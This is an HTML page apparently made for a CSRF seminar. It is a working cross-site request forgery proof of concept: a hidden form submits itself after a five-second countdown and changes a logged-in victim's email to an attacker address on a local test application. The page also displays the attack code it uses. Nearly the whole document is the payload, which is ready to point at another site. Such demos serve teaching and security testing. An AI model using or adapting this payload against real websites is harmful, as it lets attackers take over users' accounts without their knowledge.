<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>CSRF seminar - change email attack</title>
    </head>

    <body>
        POST HTTP invisible request in <span id="timer">5</span> seconds:<br />
        <form name="hackForm" method="POST" action="http://127.0.0.1:8080/?p=email">
            <input type="hidden" name="email" value="mail@attacker.com">
        </form>
        <script type="text/javascript">
            var timer = 5; // 5 seconds
            var updateId = setInterval(function() {
                timer--; // remove 1 second
                document.getElementById("timer").innerHTML = timer; // update HTML
            }, 1000); // each second
            setTimeout(function() {
                clearInterval(updateId); // remove HTML update
                document.hackForm.submit(); // submit form
            }, 5000);
        </script>
        <br />
        <br />
        <hr />
        Code:<br />
        <code>
        &lt;form name="hackForm" method="POST" action="http://127.0.0.1:8080/?p=email"&gt;
            &lt;input type="hidden" name="email" value="mail@attacker.com"&gt;
        &lt;/form&gt;
        &lt;script type="text/javascript"&gt;document.hackForm.submit();&lt;/script&gt;
        </code>
    </body>
</html>
